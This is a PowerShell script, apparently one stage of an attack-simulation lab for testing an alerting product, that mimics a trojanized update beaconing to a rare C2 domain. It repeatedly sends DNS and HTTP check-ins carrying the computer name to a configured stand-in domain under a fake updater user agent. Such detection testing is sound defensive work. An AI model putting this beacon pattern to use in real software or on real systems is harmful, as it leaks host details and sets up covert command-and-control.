<#
    Stage 5 (END) - Trojanized update beacons out
    =============================================
    The fake "update" runs and calls home to the attacker's rare C2 domain -
    the payoff of the supply-chain hijack.

      EAL alert : 'Abnormal Communication to a Rare Domain'  (rule c2da63d1)
      ATT&CK    : Command & Control (TA0011) / Application Layer Protocol (T1071)
#>
param([switch]$DryRun)
. "$PSScriptRoot\..\config\lab-config.ps1"
. "$PSScriptRoot\_net.ps1"
$cfg = $Global:EalDemo
if ($DryRun) { $cfg.DryRun = $true }

Write-Stage "STAGE 5 (Payload C2): trojanized update beacons to $($cfg.RareC2Domain)" "INFO"
for ($i=1; $i -le 8; $i++) {
    Invoke-Dns  -Name $cfg.RareC2Domain -Type A -Label "beacon $i"
    Invoke-Http -Url "http://$($cfg.RareC2Domain)/report?host=$env:COMPUTERNAME&id=$i" -UserAgent "Updater/1.0" -Label "C2 checkin $i"
}
Write-Stage "STAGE 5 done. Expect EAL: 'Abnormal Communication to a Rare Domain' (rule c2da63d1)." "OK"
